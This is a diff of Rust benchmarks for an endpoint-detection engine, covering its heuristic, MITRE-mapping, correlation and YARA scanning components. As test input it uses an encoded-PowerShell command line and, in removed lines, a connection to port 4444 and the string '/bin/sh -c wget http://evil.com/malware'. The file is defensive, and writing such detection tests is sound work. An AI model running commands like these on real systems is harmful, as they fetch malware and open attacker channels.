@@ -1,27 +1,48 @@
 use criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};
+use coreedr::config::DetectionConfig;
+use coreedr::heuristic_engine::HeuristicEngine;
+use coreedr::mitre::mapper::{MitreMapper, DetectionEvent};
+use coreedr::correlation::engine::{CorrelationEngine, CorrelatedEvent, EventType, Severity};
+use coreedr::process_monitor::ProcessInfo;
+use coreedr::yara::YaraManager;
 use std::collections::HashMap;
+use std::time::Duration;
+
+fn make_process(name: &str, pid: u32, parent: u32, mem_kb: u64) -> ProcessInfo {
+    ProcessInfo {
+        pid,
+        name: name.to_string(),
+        path: format!("/usr/bin/{}", name),
+        command_line: "powershell -encodedcommand".to_string(),
+        parent_pid: parent,
+        user: "root".to_string(),
+        memory_usage_kb: mem_kb,
+        cpu_percent: 5.0,
+        start_time: chrono::Utc::now(),
+        hash: None,
+        risk_score: 0,
+        chain_depth: 0,
+        root_pid: parent,
+    }
+}
 
 fn bench_heuristic_engine(c: &mut Criterion) {
     let mut group = c.benchmark_group("heuristic_engine");
 
-    let mut details = HashMap::new();
-    details.insert("CommandLine".to_string(), "powershell -encodedcommand".to_string());
-    details.insert("ParentProcess".to_string(), "explorer.exe".to_string());
+    let process = make_process("suspicious.exe", 1234, 567, 100_000);
 
-    group.bench_function("analyze_process_creation", |b| {
+    group.bench_function("analyze_single_process", |b| {
         b.iter(|| {
-            let engine = crate::heuristic_engine::HeuristicEngine::new();
-            engine.analyze_process("test.exe", 1234, 567, &details)
-        })
-    });
-
-    group.bench_function("analyze_network_connection", |b| {
-        b.iter(|| {
-            let engine = crate::heuristic_engine::HeuristicEngine::new();
-            let mut net_details = HashMap::new();
-            net_details.insert("remote_ip".to_string(), "185.220.101.45".to_string());
-            net_details.insert("remote_port".to_string(), "4444".to_string());
-            engine.analyze_network("test.exe", 1234, &net_details)
+            let mut engine = HeuristicEngine::new(DetectionConfig {
+                enable_heuristic: true,
+                enable_signature: true,
+                enable_behavioral: false,
+                entropy_threshold: 7.5,
+                suspicious_api_threshold: 5,
+                max_process_chain_depth: 10,
+                yara_rules_path: std::path::PathBuf::from("/tmp/rules"),
+            });
+            engine.analyze(&process)
         })
     });
 
@@ -31,23 +52,20 @@ fn bench_heuristic_engine(c: &mut Criterion) {
 fn bench_mitre_mapper(c: &mut Criterion) {
     let mut group = c.benchmark_group("mitre_mapper");
 
-    let mapper = crate::mitre::mapper::MitreMapper::new();
-
     let mut details = HashMap::new();
     details.insert("CommandLine".to_string(), "powershell -encodedcommand".to_string());
 
-    group.bench_function("map_single_event", |b| {
-        b.iter(|| {
-            mapper.map_event("process_creation", &details)
-        })
-    });
+    let event = DetectionEvent {
+        event_type: "process_creation".to_string(),
+        severity: "high".to_string(),
+        source: "coreedr".to_string(),
+        details,
+        timestamp: chrono::Utc::now().to_rfc3339(),
+    };
 
-    group.bench_function("map_event_batch_100", |b| {
-        b.iter(|| {
-            for _ in 0..100 {
-                mapper.map_event("process_creation", &details);
-            }
-        })
+    group.bench_function("map_event", |b| {
+        let mapper = MitreMapper::new();
+        b.iter(|| mapper.map_event(&event))
     });
 
     group.finish();
@@ -56,43 +74,22 @@ fn bench_mitre_mapper(c: &mut Criterion) {
 fn bench_correlation_engine(c: &mut Criterion) {
     let mut group = c.benchmark_group("correlation_engine");
 
-    group.bench_function("add_event_1000", |b| {
+    group.bench_function("add_event", |b| {
         b.iter(|| {
-            let mut engine = crate::correlation::engine::CorrelationEngine::new();
-            for i in 0..1000 {
-                let event = crate::correlation::engine::CorrelatedEvent {
-                    id: format!("evt-{}", i),
-                    timestamp: chrono::Utc::now(),
-                    event_type: crate::correlation::engine::EventType::ProcessCreation,
-                    process_id: Some(1000 + i as u32),
-                    process_name: Some("test.exe".to_string()),
-                    parent_id: None,
-                    user: Some("user".to_string()),
-                    details: HashMap::new(),
-                    severity: crate::correlation::engine::Severity::Info,
-                };
-                engine.add_event(event);
-            }
-        })
-    });
-
-    group.bench_function("get_stats", |b| {
-        let mut engine = crate::correlation::engine::CorrelationEngine::new();
-        for i in 0..100 {
-            let event = crate::correlation::engine::CorrelatedEvent {
-                id: format!("evt-{}", i),
+            let mut engine = CorrelationEngine::new();
+            let ev = CorrelatedEvent {
+                id: "e1".to_string(),
                 timestamp: chrono::Utc::now(),
-                event_type: crate::correlation::engine::EventType::ProcessCreation,
-                process_id: Some(1000 + i as u32),
+                event_type: EventType::ProcessCreation,
+                process_id: Some(1234),
                 process_name: Some("test.exe".to_string()),
                 parent_id: None,
-                user: Some("user".to_string()),
+                user: Some("root".to_string()),
                 details: HashMap::new(),
-                severity: crate::correlation::engine::Severity::Info,
+                chain_id: None,
+                severity: Severity::Medium,
             };
-            engine.add_event(event);
-        }
-        b.iter(|| {
+            engine.add_event(ev);
             engine.get_stats()
         })
     });
@@ -102,32 +99,11 @@ fn bench_correlation_engine(c: &mut Criterion) {
 
 fn bench_yara_scanner(c: &mut Criterion) {
     let mut group = c.benchmark_group("yara_scanner");
+    let data = b"this is test data for yara scanning".to_vec();
 
-    group.bench_function("scan_clean_text", |b| {
-        let scanner = crate::yara::scanner::YaraScanner::new();
-        b.iter(|| {
-            scanner.scan_bytes(b"hello world this is clean text")
-        })
-    });
-
-    group.bench_function("scan_suspicious_text", |b| {
-        let scanner = crate::yara::scanner::YaraScanner::new();
-        b.iter(|| {
-            scanner.scan_bytes(b"/bin/sh -c wget http://evil.com/malware")
-        })
-    });
-
-    group.finish();
-}
-
-fn bench_process_monitor(c: &mut Criterion) {
-    let mut group = c.benchmark_group("process_monitor");
-
-    group.bench_function("scan_processes", |b| {
-        let mut monitor = crate::process_monitor::ProcessMonitor::new(5000);
-        b.iter(|| {
-            monitor.scan_processes()
-        })
+    group.bench_function("scan_bytes", |b| {
+        let scanner = YaraManager::new();
+        b.iter(|| scanner.scan_bytes(&data))
     });
 
     group.finish();
@@ -138,7 +114,6 @@ criterion_group!(
     bench_heuristic_engine,
     bench_mitre_mapper,
     bench_correlation_engine,
-    bench_yara_scanner,
-    bench_process_monitor,
+    bench_yara_scanner
 );
 criterion_main!(benches);
